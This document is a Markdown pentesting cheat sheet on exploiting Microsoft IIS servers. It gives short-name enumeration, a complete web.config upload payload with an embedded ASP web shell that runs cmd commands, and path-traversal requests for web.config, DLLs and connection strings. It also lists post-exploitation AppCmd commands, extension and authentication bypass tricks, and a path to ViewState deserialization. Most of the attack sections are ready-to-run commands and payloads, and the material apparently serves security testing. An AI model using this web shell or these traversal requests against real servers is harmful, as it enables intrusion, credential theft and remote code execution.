# IIS (Internet Information Services) Vulnerabilities

> **Summary**: Exploit misconfigurations and known vulnerabilities specific to Microsoft IIS web servers, including short name enumeration, handler abuse, and configuration disclosure.
> **Impact**: Information disclosure, source code leakage, authentication bypass, remote code execution.
> **Typical Severity**: Medium - High

## Detection

### Indicators
- `Server: Microsoft-IIS/<VERSION>` in response headers
- `.aspx`, `.asp`, `.ashx`, `.asmx` file extensions
- Default error pages with IIS styling
- `X-Powered-By: ASP.NET` header
- `X-AspNet-Version` header present

### Automated Detection
```bash
# Nmap IIS enumeration
nmap -sV -p 80,443 --script=http-iis-short-name-brute,http-iis-webdav-vuln <TARGET>

# Shortscan - IIS tilde enumeration
shortscan http://<TARGET>/

# Nuclei IIS templates
nuclei -u http://<TARGET> -tags iis
```

### Manual Detection
```bash
# Version detection via headers
curl -I http://<TARGET>/

# Trigger HTTPAPI 2.0 error (reveals if IIS exists without correct vhost)
curl -I http://<TARGET_IP>/ -H "Host: nonexistent"

# Internal IP disclosure (HTTP/1.0 + strip Host)
# On 302 redirects, the Location header may reveal internal IPs
printf "GET / HTTP/1.0\r\n\r\n" | nc <TARGET> 80

# Test for common IIS paths
curl http://<TARGET>/aspnet_client/
curl http://<TARGET>/web.config
curl http://<TARGET>/_vti_bin/
curl http://<TARGET>/trace.axd
```

## Exploitation

### Prerequisites
- Target runs IIS (any version)
- Depending on attack: WebDAV enabled, short names present, misconfigured handlers

### Step-by-Step

#### 1. IIS Short Name (Tilde) Enumeration

IIS versions <= 7.5 (and sometimes later) expose the 8.3 short filename format via tilde characters. This reveals partial filenames even for files behind authentication.

```bash
# Automated scanning
shortscan http://<TARGET>/

# Manual test -- if response differs for valid vs invalid short names:
curl http://<TARGET>/~1      # returns 404
curl http://<TARGET>/A~1     # returns 404 (A* file exists) vs different status
```

**Expanding short names**:
```bash
# 1. Use results from shortscan (e.g., DSO_FI~1)
# 2. Search GitHub for path matches
#    GitHub search: path:/DSO_FI
# 3. Brute-force with wordlist
ffuf -u http://<TARGET>/DSO_FIFUZZ -w <WORDLIST> -mc 200
# 4. Use AI to generate likely filename completions
```

#### 2. web.config Disclosure and Execution

If you can upload a `web.config` file (even to a directory that allows uploads), it can execute arbitrary code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!--
<%
Response.write("-"&"->")
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd /c <COMMAND>")
Response.write(objExec.StdOut.ReadAll())
Response.write("<!-"&"-")
%>
-->
```

#### 3. Virtual Directory Enumeration (Post-Exploitation)

Once you have command execution on an IIS server:
```cmd
:: List all sites
%systemroot%\system32\inetsrv\AppCmd.exe list sites

:: List virtual directories
%systemroot%\system32\inetsrv\AppCmd.exe list vdir /app.name:"<SITE_NAME>/"

:: List applications
%systemroot%\system32\inetsrv\AppCmd.exe list app
```

#### 4. Internal IP Disclosure

On IIS servers returning 302 redirects, stripping the Host header with HTTP/1.0 can leak internal IPs:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Location: https://192.168.x.x/owa/
```

#### 5. Source Code Disclosure via Path Traversal

In .NET MVC applications, traverse to web.config for assembly references:
```
GET /download?id=..%2f..%2fweb.config HTTP/1.1
GET /download?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
GET /download?id=..%2f..%2fViews/web.config HTTP/1.1
GET /download?id=..%2f..%2fglobal.asax HTTP/1.1
GET /download?id=..%2f..%2fconnectionstrings.config HTTP/1.1
```

**Key files to target**:
- `web.config` -- assembly references, connection strings, machine keys
- `global.asax` -- application startup logic
- `connectionstrings.config` -- database credentials
- `bin/<APP_NAME>.dll` -- compiled application logic (decompile with dnSpy/ILSpy)

#### 6. ASP.NET Configuration Decryption

If you obtain the MachineKey from web.config, you can:
- Forge ViewState for deserialization attacks
- Decrypt protected configuration sections
- Forge authentication tickets

```cmd
:: Decrypt protected config sections
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\<APP>"
```

**Data Protection key ring locations** (ASP.NET Core):
- `%PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys`
- `HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys`
- `App_Data\keys` directory

### Version-Specific Issues

| IIS Version | Notable Vulnerabilities |
|-------------|----------------------|
| IIS 5.x | WebDAV buffer overflow, Unicode path traversal |
| IIS 6.0 | Semicolon filename parsing (`file.asp;.jpg`), WebDAV RCE (CVE-2017-7269) |
| IIS 7.x | Tilde enumeration, handler misconfiguration |
| IIS 8.x | Short name enumeration (partially fixed) |
| IIS 10.x | HTTP/2 request smuggling, configuration leaks |

### Proof of Concept
```bash
# Short name enumeration
shortscan http://<TARGET>/

# Internal IP disclosure
printf "GET / HTTP/1.0\r\n\r\n" | nc <TARGET> 80

# web.config access attempt
curl http://<TARGET>/web.config
curl http://<TARGET>/download?file=..%2f..%2fweb.config
```

## Bypasses

### Executable Extension Bypass
```
# Try alternative executable extensions
.asp, .aspx, .ashx, .asmx, .config, .soap, .rem, .svc
.cer, .asa, .cdx, .htr

# IIS 6 semicolon trick
file.asp;.jpg    -- IIS 6 executes as ASP despite .jpg extension

# Null byte (legacy)
file.asp%00.jpg
```

### Authentication Bypass
```
# Try alternate verbs
curl -X PROPFIND http://<TARGET>/admin/
curl -X DEBUG http://<TARGET>/admin/

# URL path manipulation
http://<TARGET>/ADMIN/ (case difference)
http://<TARGET>/admin./
http://<TARGET>/admin%20/
http://<TARGET>/admin::$DATA/
```

## Escalation
- **Short name enumeration** --> discover hidden files, then access them
- **web.config disclosure** --> MachineKey leak --> ViewState deserialization RCE
- **Connection string leak** --> database access
- **DLL download** --> decompile for hardcoded secrets, further vulns
- **ObjRef leak** --> .NET Remoting exploitation

## Tools

| Tool | Usage |
|------|-------|
| [shortscan](https://github.com/bitquark/shortscan) | `shortscan http://<TARGET>/` |
| [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) | Java-based tilde enumeration |
| nmap | `nmap --script http-iis-short-name-brute <TARGET>` |
| gobuster | Directory brute-forcing with IIS-specific wordlists |
| [dnSpy](https://github.com/dnSpy/dnSpy) | Decompile downloaded .NET DLLs |
| [ILSpy](https://github.com/icsharpcode/ILSpy) | Open-source .NET decompiler |
| AppCmd.exe | `%systemroot%\system32\inetsrv\AppCmd.exe list sites` (post-exploitation) |
| Nuclei | `nuclei -u <TARGET> -tags iis` |

## References
- [HackTricks - IIS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html)
- [PayloadsAllTheThings - Upload Insecure Files (IIS web.config)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
- [Soroush Dalili - web.config exploitation](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
- [Code White - Leaking ObjRefs](https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/)
- [IIS Short Name Discovery](https://www.exploit-db.com/exploits/19525)

## See Also
- [File Upload](file-upload.md)
- [403 Bypass](../bypass/403.md)
- [Deserialization](deserialization.md)
